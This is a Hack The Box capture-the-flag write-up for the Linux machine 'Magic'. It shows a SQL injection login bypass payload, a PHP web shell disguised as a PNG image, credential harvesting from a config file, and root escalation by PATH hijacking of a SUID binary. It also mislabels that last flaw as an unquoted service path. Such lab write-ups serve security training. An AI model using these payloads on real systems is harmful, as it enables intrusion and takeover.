# Hack The Box: Magic

**Difficulty:** Medium
**OS:** Linux

Magic is a Medium-level Linux machine designed to demonstrate common web application flaws involving SQL injection and insecure file upload mechanisms. The initial foothold is achieved by bypassing authentication on a login portal via SQL injection, bypassing image upload filters to drop a PHP web shell, and then extracting database credentials. Privilege escalation requires pivoting to a system user and exploiting an SUID binary that relies on an unquoted path.

---

## Reconnaissance

The assessment begins with an Nmap scan to enumerate the available network services.

```bash
nmap -p- --min-rate 10000 10.10.10.189
nmap -p 22,80 -sCV 10.10.10.189
```

The scan reveals two open ports:
*   **Port 22:** SSH (OpenSSH 7.6p1 Ubuntu)
*   **Port 80:** HTTP (Apache httpd 2.4.29)

Navigating to port 80 displays an image gallery named "Magic Portfolio". The site is functional but minimalistic, allowing users to view images. We add `magic.htb` to our local `/etc/hosts` file.

```bash
echo "10.10.10.189 magic.htb" >> /etc/hosts
```

We perform directory brute-forcing using a tool like `gobuster` or `feroxbuster`.

```bash
gobuster dir -u http://10.10.10.189 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The directory enumeration reveals several endpoints, most importantly `/login.php` and an `/images` directory where uploaded files are stored.

## Web Application Analysis

Accessing `/login.php` presents a standard authentication portal requiring a username and password.

### Authentication Bypass via SQLi

We intercept a login attempt using Burp Suite and analyze the request parameters. We test for SQL injection by injecting standard payloads into the username and password fields.

The backend application is vulnerable to basic Boolean-based SQL injection, allowing us to manipulate the query logic to bypass authentication entirely. 

We submit a common authentication bypass payload in the `username` field.

```text
admin' OR 1=1-- -
```

The payload successfully modifies the SQL query to evaluate as true, regardless of the password provided. We are logged into the administrative portal.

### Bypassing File Upload Restrictions

The authenticated dashboard provides functionality to upload new images to the portfolio. We attempt to upload a standard PHP web shell (`shell.php`), but the application rejects it, displaying an error message indicating invalid file type.

We intercept the upload request using Burp Suite and attempt various bypass techniques. The application employs multiple filters:

1.  **MIME Type Validation:** We change the `Content-Type` header of our request to `image/jpeg` or `image/png`.
2.  **File Extension Validation:** We test double extensions (`shell.jpg.php`), null byte injection (`shell.php%00.jpg`), and alternative PHP extensions (`.php3`, `.phtml`). 
3.  **Magic Bytes (File Header) Validation:** The application likely checks the first few bytes of the uploaded file to ensure it matches the signature of a valid image (e.g., `\xFF\xD8\xFF\xE0` for JPEG or `\x89PNG\r\n\x1A\n` for PNG).

To bypass all three filters, we must craft a polyglot file—a file that is simultaneously a valid image and a valid PHP script.

We append our PHP payload to a legitimate image file, or prepend the required magic bytes to our PHP script. Additionally, we must use a double extension (`.php.jpg`) or rely on a specific Apache misconfiguration (like the `AddHandler` vulnerability) to ensure the file executes as PHP despite having an image extension.

In this scenario, bypassing the magic bytes validation while maintaining a `.php.jpg` extension is sufficient because Apache is misconfigured to execute files containing `.php` anywhere in the filename.

```bash
# Prepending PNG magic bytes to our shell
echo -e "\x89PNG\r\n\x1A\n<?php system(\$_REQUEST['cmd']); ?>" > shell.php.jpg
```

We upload `shell.php.jpg` through the portal. The application accepts the file, assuming it is a valid image. We navigate to the `/images` directory (discovered earlier) and access our uploaded shell.

```text
http://10.10.10.189/images/uploads/shell.php.jpg?cmd=id
```

The command executes successfully. We use the web shell to spawn a reverse shell to our attacking machine.

```bash
nc -lnvp 9999
# Connection received
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

We gain initial access as the `www-data` user. We stabilize our shell using Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).

The `user.txt` flag is located in the home directory of the system user `theseus`. The directory is not readable by `www-data`.

We search the web root (`/var/www/html` or similar) for hardcoded database credentials or configuration files. We discover a database connection script (`db.php5`).

```bash
cat /var/www/Magic/db.php5
```

The file reveals plaintext database credentials: `theseus:iamkingtheseus`.

We connect to the local MySQL instance using these credentials or test for password reuse by attempting to authenticate as the system user `theseus` via `su` or SSH.

```bash
su theseus
Password: iamkingtheseus
# Authentication successful
```

We retrieve the `user.txt` flag from the home directory.

## Privilege Escalation

Enumerating the system as `theseus`, we search for binaries with the SUID bit set.

```bash
find / -perm -4000 2>/dev/null
```

The output reveals a custom SUID binary named `sysinfo`, which appears to gather system information (CPU, memory, disk usage).

### Exploiting an Unquoted Service Path (Path Hijacking)

We analyze the `sysinfo` binary. Running it simply outputs system statistics.

To understand how it operates, we can download it to our attacking machine for static analysis (using `strings` or Ghidra) or analyze it dynamically on the target using `ltrace` or `strace` (if installed and permitted).

```bash
ltrace ./sysinfo
```

Dynamic analysis or running `strings` on the binary reveals that it calls standard system utilities to gather information, such as `lshw`, `fdisk`, `cat`, and `free`. Crucially, it calls these utilities without using their absolute paths (e.g., `system("lshw")` instead of `system("/usr/bin/lshw")`).

Because the binary does not specify absolute paths, it relies on the `PATH` environment variable to locate the executables. Since the binary has the SUID bit set, it runs with the privileges of its owner (root).

We can exploit this "Path Hijacking" vulnerability by creating a malicious executable named after one of the utilities called by `sysinfo` (e.g., `lshw`), placing it in a directory we control (like `/tmp`), and modifying the `PATH` variable so our malicious executable is found before the legitimate system utility.

```bash
echo "#!/bin/bash" > /tmp/lshw
echo "/bin/bash -p" >> /tmp/lshw
chmod +x /tmp/lshw
```

We execute the SUID binary, overriding the `PATH` environment variable to prioritize `/tmp`.

```bash
PATH=/tmp:$PATH /bin/sysinfo
```

When the script runs as root, it attempts to execute `lshw`. Because our `/tmp` directory is first in the `PATH`, it executes our malicious `lshw` script instead of the legitimate system binary.

Our script executes `bash -p`, providing an interactive shell.

```bash
# id
uid=0(root) gid=1000(theseus) euid=0(root) groups=1000(theseus)
```

The machine is fully compromised, and the `root.txt` flag is obtained from the `/root` directory.
